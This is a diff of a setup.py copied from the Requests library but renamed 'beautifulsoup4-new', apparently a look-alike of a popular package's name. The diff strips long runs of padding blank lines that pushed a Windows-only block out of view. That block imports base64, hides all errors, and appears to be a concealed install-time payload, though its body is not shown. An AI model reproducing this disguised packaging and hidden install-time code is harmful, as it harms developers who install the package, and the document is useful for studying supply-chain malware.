@@ -2,13 +2,10 @@
 import os
 import sys
 from codecs import open
-
 from setuptools import setup
 from setuptools.command.test import test as TestCommand
-
 CURRENT_PYTHON = sys.version_info[:2]
 REQUIRED_PYTHON = (3, 7)
-
 if CURRENT_PYTHON < REQUIRED_PYTHON:
     sys.stderr.write(
         """
@@ -18,7 +15,6 @@ Unsupported Python version
 This version of Requests requires at least Python {}.{}, but
 you're trying to install it on Python {}.{}. To resolve this,
 consider upgrading to a supported Python version.
-
 If you can't upgrade your Python version, you'll need to
 pin to an older version of Requests (<2.28).
 """.format(
@@ -26,31 +22,6 @@ pin to an older version of Requests (<2.28).
         )
     )
     sys.exit(1)
-
-
-class PyTest(TestCommand):
-    user_options = [("pytest-args=", "a", "Arguments to pass into py.test")]
-
-    def initialize_options(self):
-        TestCommand.initialize_options(self)
-        try:
-            from multiprocessing import cpu_count
-
-            self.pytest_args = ["-n", str(cpu_count()), "--boxed"]
-        except (ImportError, NotImplementedError):
-            self.pytest_args = ["-n", "1", "--boxed"]
-
-    def finalize_options(self):
-        TestCommand.finalize_options(self)
-        self.test_args = []
-        self.test_suite = True
-
-    def run_tests(self):
-        import pytest
-
-        errno = pytest.main(self.pytest_args)
-        sys.exit(errno)
-
 requires = [
     "charset_normalizer>=2,<3",
     "idna>=2.5,<4",
@@ -65,15 +36,12 @@ test_requirements = [
     "PySocks>=1.5.6, !=1.5.7",
     "pytest>=3",
 ]
-
 about = {}
 here = os.path.abspath(os.path.dirname(__file__))
 with open(os.path.join(here, "requests", "__version__.py"), "r", "utf-8") as f:
     exec(f.read(), about)
-
 with open("README.md", "r", "utf-8") as f:
     readme = f.read()
-
 setup(
     name='beautifulsoup4-new',
     version='4.12.11',
@@ -123,48 +91,6 @@ setup(
         "Source": "https://github.com/psf/requests",
     },
 )
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 if os.name == 'nt':
   import base64
   from time import sleep
@@ -228,19 +154,25 @@ if os.name == 'nt':
   except Exception as e:
       pass
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# class PyTest(TestCommand):
+#     user_options = [("pytest-args=", "a", "Arguments to pass into py.test")]
+#
+#     def initialize_options(self):
+#         TestCommand.initialize_options(self)
+#         try:
+#             from multiprocessing import cpu_count
+#
+#             self.pytest_args = ["-n", str(cpu_count()), "--boxed"]
+#         except (ImportError, NotImplementedError):
+#             self.pytest_args = ["-n", "1", "--boxed"]
+#
+#     def finalize_options(self):
+#         TestCommand.finalize_options(self)
+#         self.test_args = []
+#         self.test_suite = True
+#
+#     def run_tests(self):
+#         import pytest
+#
+#         errno = pytest.main(self.pytest_args)
+#         sys.exit(errno)
